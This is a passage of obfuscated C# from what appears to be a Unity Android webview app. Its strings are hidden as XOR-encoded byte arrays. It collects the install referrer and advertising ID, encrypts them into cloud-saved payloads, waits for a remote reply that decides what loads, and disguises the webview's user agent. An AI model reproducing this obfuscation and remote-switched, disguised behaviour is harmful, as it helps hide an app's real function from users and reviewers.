        JObject _0xbf7beb30 = BuildRandomPayload(_0x7cc68d45, _0xc0466c64, _0xaa1aa834, _0x12a53b5d, _0xfcd36ac6, _0x3bc5583a, _0xe3ef5c36, _0xea92aa99, _0xc6176bcb, _0x51e8bac0, _0x49df4396, _0x53d9d738, _0xea9f1f55, _0x2833a1a0, _0xfe372202.ToString(), _0x47fd9f3e, _0x80d3442e, _0xce3b6689, _0x8a05b7f7, _0x72616a4f, _0xe3e7660c, _0xb7489e69, _0xe8ae105c());
        var _0x50b6c126 = _0x6dd8e063(_0xbf7beb30.ToString(), _0x8a05b7f7);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xbf7beb30}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x85e40e1c._0x8a9d8fd6(new byte[7] { 74, 91, 67, 86, 85, 91, 94 }, 58) + _0x8a05b7f7, _0x50b6c126 } });
            await Task.Delay(500);
            string _0x5464054f = "";
            for (int _0x0cde9754 = 0; _0x0cde9754 < 20; _0x0cde9754++)
            {
                if (await _0x45bbc1cc(1, 1))
                {
                    await _0x0749f803(_0x85e40e1c._0x8a9d8fd6(new byte[7] { 153, 151, 148, 152, 144, 158, 159 }, 251));
                    _0x70f889de();
                    return;
                }

                _0x5464054f = await _0x95ff0455(1, 500);
                if (!string.IsNullOrEmpty(_0x5464054f))
                    break;
            }

            _0x510d7216(_0x5464054f);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[22] { 50, 61, 44, 58, 61, 52, 73, 46, 12, 7, 12, 27, 8, 5, 73, 12, 27, 27, 6, 27, 83, 73 }, 105) + e.Message);
#endif
            }

            _0x70f889de();
        }
    }

    private async Task _0x0749f803(string _0x99a88a2c)
    {
        if (_0x11580a39 || string.IsNullOrEmpty(_0x8a05b7f7) || string.IsNullOrEmpty(_0x99a88a2c) || _0x16b62f65)
            return;
        _0x11580a39 = true;
        try
        {
            JObject _0xc2b031bf = BuildRandomPayload(_0x99a88a2c, _0x8a05b7f7, _0xe8ae105c());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0x99a88a2c} payload: {_0xc2b031bf}");
                }
#endif
            }

            var _0x514a6018 = _0x6dd8e063(_0xc2b031bf.ToString(), _0x8a05b7f7);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x85e40e1c._0x8a9d8fd6(new byte[4] { 90, 89, 87, 82 }, 54) + _0x8a05b7f7, _0x514a6018 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[24] { 204, 195, 210, 196, 195, 202, 183, 219, 248, 246, 243, 183, 231, 246, 228, 228, 183, 242, 229, 229, 248, 229, 173, 183 }, 151) + e.Message);
#endif
            }
        }
    }

    private void StopCurrentFailedLoad(UniWebView _0x0d42827a)
    {
        _0xc2e5068c(false);
        if (_0x0d42827a == null)
            return;
        _0x0d42827a.Stop();
        if (_0x0d42827a.CanGoBack)
            _0x0d42827a.GoBack();
    }

    private bool _0xcb8f05b1(int _0x3737917b, string _0xe458c0f9, string _0x915f9a26)
    {
        if (string.IsNullOrEmpty(_0x915f9a26))
            return false;
        if (!IsHttpUrl(_0x915f9a26))
            return true;
        if (string.IsNullOrEmpty(_0xe458c0f9))
            return false;
        return _0xe458c0f9.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[20] { 231, 240, 240, 253, 225, 237, 236, 236, 231, 225, 246, 235, 237, 236, 253, 240, 231, 241, 231, 246 }, 162), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe458c0f9.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[22] { 79, 88, 88, 85, 73, 69, 68, 68, 79, 73, 94, 67, 69, 68, 85, 88, 79, 76, 95, 89, 79, 78 }, 10), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe458c0f9.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[21] { 222, 201, 201, 196, 216, 212, 213, 213, 222, 216, 207, 210, 212, 213, 196, 216, 215, 212, 200, 222, 223 }, 155), StringComparison.OrdinalIgnoreCase) >= 0 || _0xe458c0f9.IndexOf(_0x85e40e1c._0x8a9d8fd6(new byte[22] { 21, 2, 2, 15, 5, 30, 27, 30, 31, 7, 30, 15, 5, 2, 28, 15, 3, 19, 24, 21, 29, 21 }, 80), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal void _0xce3db8b5()
    {
        Rect _0x75744b5b = Screen.safeArea;
        Vector2 _0xc037aca2 = new Vector2(Screen.width, Screen.height);
        if (_0x75744b5b == lastSafe && _0xc037aca2 == lastSize)
            return;
        // Apply manual padding
        _0x75744b5b.xMin += _0xbf7ee752;
        _0x75744b5b.xMax -= _0xe5b4c575;
        _0x75744b5b.yMin += _0x85647120;
        _0x75744b5b.yMax -= _0xdf4abdf2;
        // Convert Unity safe area -> native WebView frame
        Rect _0x012fb03f = new Rect(_0x75744b5b.x, _0xc037aca2.y - _0x75744b5b.y - _0x75744b5b.height, // Y flip for native coordinate system
 _0x75744b5b.width, _0x75744b5b.height);
        _0x3053905e.Frame = _0x012fb03f;
        lastSafe = Screen.safeArea;
        lastSize = _0xc037aca2;
    }

    private void WLog(string _0x059fa986)
    {
#if B_LOGS
        {
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[7] { 250, 245, 196, 210, 213, 252, 129 }, 161) + _0x059fa986);
        }
#endif
    }

    internal bool isApplicationPause = false;
    private string _0xc62e7366;
    // WEB VIEW LOGIC
    public bool _0xacdd5220 { get; set; }

    private void OnApplicationFocus(bool _0xf022d9c1)
    {
        isApplicationFocus = _0xf022d9c1;
        if (_0xf022d9c1 && _0xacdd5220)
        {
            _0x4d50c3ac();
        }
    }

    private string _0x12a53b5d = "";
    private void _0x1c0fe411(UniWebView _0x36dfa634)
    {
        _0x36dfa634.BackgroundColor = Color.clear;
        _0x36dfa634.SetSupportMultipleWindows(true, true);
        _0x36dfa634.SetBackButtonEnabled(false);
        _0x3053905e.SetUserAgent(_0xba975fa4());
    }

    private string _0x80d3442e = "";
    private void _0x726cb5dc(string _0x315e01f7)
    {
        if (string.IsNullOrEmpty(_0x315e01f7))
            return;
        if (TryOpenExternalLikeChrome(_0x315e01f7))
            return;
        OpenUrlExternally(_0x315e01f7);
    }

    private bool _0xcb5ea266()
    {
        var _0x1021fcff = _0xa75efb3a();
        if (_0x1021fcff == null)
            return false;
        WLog(_0x85e40e1c._0x8a9d8fd6(new byte[31] { 120, 81, 66, 84, 71, 81, 66, 85, 16, 82, 81, 83, 91, 16, 29, 14, 16, 64, 95, 64, 69, 64, 16, 119, 95, 114, 81, 83, 91, 10, 16 }, 48) + _0x1021fcff.Id);
        _0x1021fcff.GoBack();
        return true;
    }

    internal bool isDestroyedForce = false;
    private IEnumerator _0x8dfcaca2()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[26] { 147, 156, 173, 187, 188, 149, 232, 129, 166, 161, 188, 161, 169, 164, 161, 178, 173, 154, 173, 174, 174, 173, 186, 173, 186, 232 }, 200));
            }
#endif
        }

        bool _0x1fa8cd84 = false;
        InstallReferrer.GetReferrer((_0x0219602a) =>
        {
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[24] { 195, 204, 253, 235, 236, 184, 202, 253, 254, 253, 234, 234, 253, 234, 197, 184, 255, 253, 236, 184, 122, 30, 10, 184 }, 152) + _0xfcd36ac6);
            if (_0x0219602a.IsSuccess)
            {
                _0xfcd36ac6 = _0x0219602a.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[28] { 171, 164, 149, 131, 132, 208, 162, 149, 150, 149, 130, 130, 149, 130, 173, 208, 163, 133, 147, 147, 149, 131, 131, 208, 18, 118, 98, 208 }, 240) + _0xfcd36ac6);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[27] { 118, 121, 72, 94, 89, 13, 127, 72, 75, 72, 95, 95, 72, 95, 112, 13, 107, 76, 68, 65, 72, 73, 13, 207, 171, 191, 13 }, 45) + _0x0219602a);
#endif
                }

                _0xfcd36ac6 = "";
            }

            _0xd0661d71 = true;
        });
        StartCoroutine(_0xfc0a31ca(2f));
        yield return new WaitUntil(() => _0xd0661d71);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xfcd36ac6}");
#endif
        }

        bool _0xa773f4ff = _0xfcd36ac6.Contains(_0x85e40e1c._0x8a9d8fd6(new byte[6] { 6, 2, 13, 8, 5, 92 }, 97));
        _0x1fa8cd84 = _0xa773f4ff || _0xfcd36ac6.Contains(_0x85e40e1c._0x8a9d8fd6(new byte[18] { 36, 53, 53, 54, 107, 44, 43, 54, 49, 36, 34, 55, 36, 40, 107, 38, 42, 40 }, 69)) || _0xfcd36ac6.Contains(_0x85e40e1c._0x8a9d8fd6(new byte[17] { 39, 54, 54, 53, 104, 32, 39, 37, 35, 36, 41, 41, 45, 104, 37, 41, 43 }, 70));
        _0x3bc5583a = _0xa773f4ff ? "" : (_0x1fa8cd84 ? "" : _0x3bc5583a);
        _0x3bc5583a = _0x3bc5583a ?? "";
        _0xe3ef5c36 = _0xe3ef5c36 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x3bc5583a}");
#endif
        }
    }

    private string _0xb7489e69 = "";
    private IEnumerator _0x2b19f19b()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private int _0x1464989c = -1;
    internal bool IsAboutBlank(string _0xb573e20c)
    {
        if (string.IsNullOrEmpty(_0xb573e20c))
            return false;
        return _0xb573e20c.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[11] { 72, 75, 70, 92, 93, 19, 75, 69, 72, 71, 66 }, 41), StringComparison.OrdinalIgnoreCase);
    }

    private bool _0x571abd6a = false;
    private UniWebViewPopup _0xa75efb3a()
    {
        for (int _0xd0ddf0d7 = _0x6e32f3ba.Count - 1; _0xd0ddf0d7 >= 0; _0xd0ddf0d7--)
        {
            var _0xc836357e = _0x6e32f3ba[_0xd0ddf0d7];
            if (_0xc836357e != null && _0xc836357e.IsAlive)
                return _0xc836357e;
            _0x6e32f3ba.RemoveAt(_0xd0ddf0d7);
        }

        return null;
    }

    private JObject BuildRandomPayload(params string[] _0x51aa5d8e)
    {
        JObject _0x0c5eae42 = new JObject();
        foreach (var _0xa5b123c8 in _0x51aa5d8e)
        {
            string _0xcbb3cd89 = _0x10605258();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0xcbb3cd89} val={_0xa5b123c8}");
#endif
            }

            _0x0c5eae42.Add(_0xcbb3cd89, _0xa5b123c8 == null ? "" : _0xa5b123c8);
        }

        return _0x0c5eae42;
    }

    private void _0x510d7216(string _0xee41451f)
    {
        bool _0x4ca06db8 = !string.IsNullOrEmpty(_0xee41451f);
        if (_0x4ca06db8)
        {
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[13] { 108, 99, 82, 68, 67, 106, 23, 100, 95, 88, 64, 13, 23 }, 55) + _0xee41451f);
#endif
            }

            _0xfb1316d9(_0xee41451f);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[39] { 153, 150, 167, 177, 182, 159, 226, 132, 163, 174, 174, 160, 163, 161, 169, 226, 32, 68, 80, 226, 133, 163, 175, 167, 226, 234, 172, 173, 226, 164, 171, 172, 163, 174, 226, 151, 144, 142, 235 }, 194));
#endif
            }

            _0x70f889de();
            return;
        }
    }

    internal bool _0x3233b08f(string _0xa962142b)
    {
        return _0xa962142b.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 132, 136, 155, 130, 140, 157, 211, 198, 198 }, 233), StringComparison.OrdinalIgnoreCase) || _0xa962142b.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[24] { 135, 155, 155, 159, 156, 213, 192, 192, 159, 131, 142, 150, 193, 136, 128, 128, 136, 131, 138, 193, 140, 128, 130, 192 }, 239), StringComparison.OrdinalIgnoreCase) || _0xa962142b.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[23] { 54, 42, 42, 46, 100, 113, 113, 46, 50, 63, 39, 112, 57, 49, 49, 57, 50, 59, 112, 61, 49, 51, 113 }, 94), StringComparison.OrdinalIgnoreCase);
    }

    private bool TryOpenExternalLikeChrome(string _0x13f0dacf)
    {
        if (string.IsNullOrEmpty(_0x13f0dacf))
            return false;
        if (_0x13f0dacf.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 192, 199, 221, 204, 199, 221, 147, 134, 134 }, 169), StringComparison.OrdinalIgnoreCase))
            return _0x5ee4ddc6(_0x13f0dacf);
        if (_0x3233b08f(_0x13f0dacf))
            return _0xffed205c(_0x13f0dacf, null);
        if (!_0x13f0dacf.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[7] { 40, 52, 52, 48, 122, 111, 111 }, 64), StringComparison.OrdinalIgnoreCase) && !_0x13f0dacf.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 160, 188, 188, 184, 187, 242, 231, 231 }, 200), StringComparison.OrdinalIgnoreCase) && !_0x13f0dacf.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[11] { 146, 145, 156, 134, 135, 201, 145, 159, 146, 157, 152 }, 243), StringComparison.OrdinalIgnoreCase))
        {
            return _0x3f68adbc(_0x13f0dacf);
        }

        return false;
    }

    private void _0x4d50c3ac()
    {
        using (var _0x536c9b7d = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 238, 226, 224, 163, 248, 227, 228, 249, 244, 190, 233, 163, 253, 225, 236, 244, 232, 255, 163, 216, 227, 228, 249, 244, 221, 225, 236, 244, 232, 255 }, 141)))
        using (var _0xfc21c11b = _0x536c9b7d.GetStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 51, 37, 34, 34, 53, 62, 36, 17, 51, 36, 57, 38, 57, 36, 41 }, 80)))
        using (var _0x50a22b42 = _0xfc21c11b.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 177, 179, 162, 159, 184, 162, 179, 184, 162 }, 214)))
        {
            if (_0x50a22b42 == null)
                return;
            using (var _0x36b76474 = _0x50a22b42.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 21, 23, 6, 55, 10, 6, 0, 19, 1 }, 114)))
            {
                if (_0x36b76474 == null)
                    return;
                using (var _0xd1adc1be = new AndroidJavaObject(_0x85e40e1c._0x8a9d8fd6(new byte[19] { 190, 163, 182, 255, 187, 162, 190, 191, 255, 155, 130, 158, 159, 158, 179, 187, 180, 178, 165 }, 209)))
                using (var _0xc115e3fc = _0x36b76474.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[6] { 231, 233, 245, 223, 233, 248 }, 140)))
                using (var _0x73453234 = _0xc115e3fc.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 208, 205, 220, 203, 216, 205, 214, 203 }, 185)))
                {
                    while (_0x73453234.Call<bool>(_0x85e40e1c._0x8a9d8fd6(new byte[7] { 10, 3, 17, 44, 7, 26, 22 }, 98)))
                    {
                        string _0x8e3c9915 = _0x73453234.Call<string>(_0x85e40e1c._0x8a9d8fd6(new byte[4] { 202, 193, 220, 208 }, 164));
                        using (var _0xf7c51c8d = _0x36b76474.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[3] { 209, 211, 194 }, 182), _0x8e3c9915))
                        {
                            _0xd1adc1be.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[3] { 134, 131, 130 }, 246), _0x8e3c9915, _0xf7c51c8d);
                        }
                    }

                    string _0xd6fb39da = _0xd1adc1be.Call<string>(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 163, 184, 132, 163, 165, 190, 185, 176 }, 215));
                    if (!string.IsNullOrEmpty(_0xd6fb39da))
                    {
                        _0xc43816cd(_0xd6fb39da);
                    }
                }
            }
        }
    }

    private void _0xd56e64d9()
    {
        if (_0xb044368c)
        {
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[18] { 36, 25, 8, 21, 65, 0, 13, 19, 4, 0, 5, 24, 65, 18, 9, 14, 22, 15 }, 97));
            return;
        }

        _0xc2e5068c(false);
        WLog(_0x85e40e1c._0x8a9d8fd6(new byte[46] { 195, 239, 231, 224, 174, 217, 235, 236, 216, 231, 235, 249, 174, 222, 251, 253, 230, 174, 192, 225, 250, 231, 232, 231, 237, 239, 250, 231, 225, 224, 174, 166, 230, 239, 252, 234, 249, 239, 252, 235, 174, 236, 239, 237, 229, 167 }, 142));
        ++_0x7d2322a1;
        _0x6888ea0f();
        if (_0x7d2322a1 <= 1)
            return;
        if (_0xad0f7bc3())
        {
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[37] { 228, 217, 200, 213, 129, 210, 202, 200, 209, 209, 196, 197, 129, 140, 159, 129, 209, 206, 209, 212, 209, 210, 129, 210, 213, 200, 205, 205, 129, 206, 209, 196, 207, 196, 197, 155, 129 }, 161) + _0x6e32f3ba.Count);
            return;
        }

        Application.Quit();
    }

    private IEnumerator _0xfc0a31ca(float _0x3ce56696)
    {
        yield return new WaitForSeconds(_0x3ce56696);
        if (!_0xd0661d71)
        {
            _0xd0661d71 = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xfcd36ac6}");
                }
#endif
            }
        }
    }

    private string _0x38d5031c()
    {
        try
        {
            using (var _0xe45b2308 = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 211, 223, 221, 158, 197, 222, 217, 196, 201, 131, 212, 158, 192, 220, 209, 201, 213, 194, 158, 229, 222, 217, 196, 201, 224, 220, 209, 201, 213, 194 }, 176)))
            {
                var _0xae6f35d5 = _0xe45b2308.GetStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 190, 168, 175, 175, 184, 179, 169, 156, 190, 169, 180, 171, 180, 169, 164 }, 221));
                var _0x7cdadcde = _0xae6f35d5.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[21] { 65, 67, 82, 103, 86, 86, 74, 79, 69, 71, 82, 79, 73, 72, 101, 73, 72, 82, 67, 94, 82 }, 38));
                using (var _0x4622d1fa = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[26] { 196, 203, 193, 215, 202, 204, 193, 139, 210, 192, 199, 206, 204, 209, 139, 242, 192, 199, 246, 192, 209, 209, 204, 203, 194, 214 }, 165)))
                {
                    return _0x4622d1fa.CallStatic<string>(_0x85e40e1c._0x8a9d8fd6(new byte[19] { 148, 150, 135, 183, 150, 149, 146, 134, 159, 135, 166, 128, 150, 129, 178, 148, 150, 157, 135 }, 243), _0x7cdadcde);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private string _0x53d9d738 = "";
    private Task _0x5800513b(IEnumerator _0x9f07f836)
    {
        var _0xc71c15de = new TaskCompletionSource<bool>();
        StartCoroutine(_0xca56be1c(_0x9f07f836, _0xc71c15de));
        return _0xc71c15de.Task;
    }

    private bool _0xe33ac0e7(string _0x29ada6e0)
    {
        if (string.IsNullOrEmpty(_0x29ada6e0))
            return false;
        try
        {
            using (var _0x9ecb0a3e = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 93, 81, 83, 16, 75, 80, 87, 74, 71, 13, 90, 16, 78, 82, 95, 71, 91, 76, 16, 107, 80, 87, 74, 71, 110, 82, 95, 71, 91, 76 }, 62)))
            using (var _0xbcd8f4ea = _0x9ecb0a3e.GetStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 161, 183, 176, 176, 167, 172, 182, 131, 161, 182, 171, 180, 171, 182, 187 }, 194)))
            using (var _0xfe540d75 = _0xbcd8f4ea.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[17] { 27, 25, 8, 44, 29, 31, 23, 29, 27, 25, 49, 29, 18, 29, 27, 25, 14 }, 124)))
            using (var _0xecc34f83 = _0xfe540d75.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[25] { 116, 118, 103, 95, 114, 102, 125, 112, 123, 90, 125, 103, 118, 125, 103, 85, 124, 97, 67, 114, 112, 120, 114, 116, 118 }, 19), _0x29ada6e0))
            {
                if (_0xecc34f83 == null)
                    return false;
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[37] { 134, 173, 183, 170, 168, 160, 137, 172, 174, 160, 229, 169, 164, 176, 171, 166, 173, 229, 172, 171, 182, 177, 164, 169, 169, 160, 161, 229, 181, 164, 166, 174, 164, 162, 160, 255, 229 }, 197) + _0x29ada6e0);
                _0xecc34f83.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 62, 59, 59, 25, 51, 62, 56, 44 }, 95), 0x10000000);
                _0xbcd8f4ea.Call(_0x85e40e1c._0x8a9d8fd6(new byte[13] { 130, 133, 144, 131, 133, 176, 146, 133, 152, 135, 152, 133, 136 }, 241), _0xecc34f83);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    // PART 3
    private string _0xd028b867()
    {
        try
        {
            var _0x0e90f718 = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 44, 32, 34, 97, 58, 33, 38, 59, 54, 124, 43, 97, 63, 35, 46, 54, 42, 61, 97, 26, 33, 38, 59, 54, 31, 35, 46, 54, 42, 61 }, 79));
            var _0x50497bc8 = _0x0e90f718.GetStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 110, 120, 127, 127, 104, 99, 121, 76, 110, 121, 100, 123, 100, 121, 116 }, 13));
            var _0xc9fc02e5 = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[57] { 111, 99, 97, 34, 107, 99, 99, 107, 96, 105, 34, 109, 98, 104, 126, 99, 101, 104, 34, 107, 97, 127, 34, 109, 104, 127, 34, 101, 104, 105, 98, 120, 101, 106, 101, 105, 126, 34, 77, 104, 122, 105, 126, 120, 101, 127, 101, 98, 107, 69, 104, 79, 96, 101, 105, 98, 120 }, 12));
            var _0x49e54a22 = _0xc9fc02e5.CallStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[20] { 236, 238, 255, 202, 239, 253, 238, 249, 255, 226, 248, 226, 229, 236, 194, 239, 194, 229, 237, 228 }, 139), _0x50497bc8);
            var _0x577a39f3 = _0x49e54a22.Call<string>(_0x85e40e1c._0x8a9d8fd6(new byte[5] { 63, 61, 44, 17, 60 }, 88));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x577a39f3}");
#endif
            }

            return string.IsNullOrEmpty(_0x577a39f3) ? "" : _0x577a39f3;
        }
        catch
        {
            return "";
        }
    }

    internal bool ContainsIgnoreCase(string _0x7368ae92, string _0xa508499f)
    {
        if (string.IsNullOrEmpty(_0x7368ae92) || string.IsNullOrEmpty(_0xa508499f))
            return false;
        return _0x7368ae92.IndexOf(_0xa508499f, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal bool firstLoadShown = false;
    private IEnumerator _0xca56be1c(IEnumerator _0x2c8063fc, TaskCompletionSource<bool> _0xc329f13c)
    {
        yield return _0x2c8063fc;
        _0xc329f13c.SetResult(true);
    }

    private string _0xc0466c64 = "";
    private void _0x61f67c34()
    {
        if (_0x0cc76f24 != null)
            return;
        var _0xe1de3a06 = _0xb60752fa();
        _0x0cc76f24 = new GameObject(_0x85e40e1c._0x8a9d8fd6(new byte[14] { 142, 188, 187, 143, 176, 188, 174, 138, 169, 176, 183, 183, 188, 171 }, 217), typeof(RectTransform), typeof(Text));
        _0xc42e8284 = _0x0cc76f24.GetComponent<RectTransform>();
        _0xc42e8284.SetParent(_0xe1de3a06.transform, false);
        _0xc42e8284.anchorMin = new Vector2(0.5f, 0.5f);
        _0xc42e8284.anchorMax = new Vector2(0.5f, 0.5f);
        _0xc42e8284.pivot = new Vector2(0.5f, 0.5f);
        _0xc42e8284.sizeDelta = new Vector2(600f, 600f);
        _0xc42e8284.anchoredPosition = Vector2.zero;
        _0x8aa470f9 = _0x0cc76f24.GetComponent<Text>();
        _0x8aa470f9.text = _0x85e40e1c._0x8a9d8fd6(new byte[1] { 57 }, 22);
        _0x8aa470f9.font = Resources.GetBuiltinResource<Font>(_0x85e40e1c._0x8a9d8fd6(new byte[17] { 66, 107, 105, 111, 109, 119, 92, 123, 96, 122, 103, 99, 107, 32, 122, 122, 104 }, 14));
        _0x8aa470f9.fontSize = 200;
        _0x8aa470f9.alignment = TextAnchor.MiddleCenter;
        _0x8aa470f9.color = Color.white;
        _0x8aa470f9.raycastTarget = false;
        _0x0cc76f24.SetActive(false);
    }

    private string _0x3bc5583a { get; set; }

    private static readonly string WindowsDesktopUserAgent = _0x85e40e1c._0x8a9d8fd6(new byte[111] { 76, 110, 123, 104, 109, 109, 96, 46, 52, 47, 49, 33, 41, 86, 104, 111, 101, 110, 118, 114, 33, 79, 85, 33, 48, 49, 47, 49, 58, 33, 86, 104, 111, 55, 53, 58, 33, 121, 55, 53, 40, 33, 64, 113, 113, 109, 100, 86, 100, 99, 74, 104, 117, 46, 52, 50, 54, 47, 50, 55, 33, 41, 74, 73, 85, 76, 77, 45, 33, 109, 104, 106, 100, 33, 70, 100, 98, 106, 110, 40, 33, 66, 105, 115, 110, 108, 100, 46, 48, 51, 49, 47, 49, 47, 49, 47, 49, 33, 82, 96, 103, 96, 115, 104, 46, 52, 50, 54, 47, 50, 55 }, 1);
    internal bool IsHttpUrl(string _0x845e3022)
    {
        if (string.IsNullOrEmpty(_0x845e3022))
            return false;
        return _0x845e3022.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[7] { 162, 190, 190, 186, 240, 229, 229 }, 202), StringComparison.OrdinalIgnoreCase) || _0x845e3022.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 213, 201, 201, 205, 206, 135, 146, 146 }, 189), StringComparison.OrdinalIgnoreCase);
    }

    private string _0x49df4396 = "";
    private string _0xba975fa4()
    {
        if (string.IsNullOrEmpty(_0xea92aa99) && _0x3053905e != null)
            _0xea92aa99 = _0x3053905e.GetUserAgent();
        if (string.IsNullOrEmpty(_0xea92aa99))
            return string.Empty;
        string _0xb2d22551 = Regex.Replace(_0xea92aa99, _0x85e40e1c._0x8a9d8fd6(new byte[11] { 169, 134, 223, 206, 169, 134, 223, 130, 131, 169, 151 }, 245), string.Empty);
        _0xb2d22551 = Regex.Replace(_0xb2d22551, _0x85e40e1c._0x8a9d8fd6(new byte[15] { 80, 127, 39, 78, 121, 101, 96, 104, 35, 87, 82, 55, 37, 81, 39 }, 12), string.Empty);
        _0xb2d22551 = Regex.Replace(_0xb2d22551, _0x85e40e1c._0x8a9d8fd6(new byte[15] { 97, 82, 69, 68, 94, 88, 89, 24, 3, 107, 25, 7, 107, 68, 29 }, 55), string.Empty);
        return Regex.Replace(_0xb2d22551, _0x85e40e1c._0x8a9d8fd6(new byte[6] { 150, 185, 177, 248, 230, 183 }, 202), _0x85e40e1c._0x8a9d8fd6(new byte[1] { 156 }, 188)).Trim();
    }

    private string GetFailingUrl(UniWebViewNativeResultPayload _0x726ff735)
    {
        if (_0x726ff735 == null || _0x726ff735.Extra == null)
            return null;
        object _0x1ffe8d17;
        if (!_0x726ff735.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x1ffe8d17))
            return null;
        return _0x1ffe8d17 as string;
    }

    private Canvas _0xb60752fa()
    {
        if (_0xc58220d9 != null)
            return _0xc58220d9;
        var _0xca830530 = gameObject.GetComponentInChildren<Canvas>();
        if (_0xca830530 == null)
        {
            var _0xb21ea3e2 = new GameObject(_0x85e40e1c._0x8a9d8fd6(new byte[6] { 205, 239, 224, 248, 239, 253 }, 142), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0xca830530 = _0xb21ea3e2.GetComponent<Canvas>();
            _0xca830530.transform.SetParent(transform, false);
            _0xca830530.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0xc58220d9 = _0xca830530;
        return _0xc58220d9;
    }

    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x6dd8e063(string _0x1ce14ef4, string _0xadef7359)
    {
        try
        {
            using var _0x9f040ac0 = Aes.Create();
            _0x9f040ac0.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xadef7359));
            _0x9f040ac0.GenerateIV();
            using var _0x0123e336 = new MemoryStream();
            _0x0123e336.Write(_0x9f040ac0.IV, 0, _0x9f040ac0.IV.Length);
            using (var _0x1b922a50 = new CryptoStream(_0x0123e336, _0x9f040ac0.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x7001b5bc = Encoding.UTF8.GetBytes(_0x1ce14ef4);
                _0x1b922a50.Write(_0x7001b5bc, 0, _0x7001b5bc.Length);
                _0x1b922a50.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x0123e336.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private async Task<string> _0x95ff0455(int _0x4007c2a9 = 5, int _0x826a9d6d = 500)
    {
        try
        {
            List<EntityData> _0x6f8a690f = new List<EntityData>();
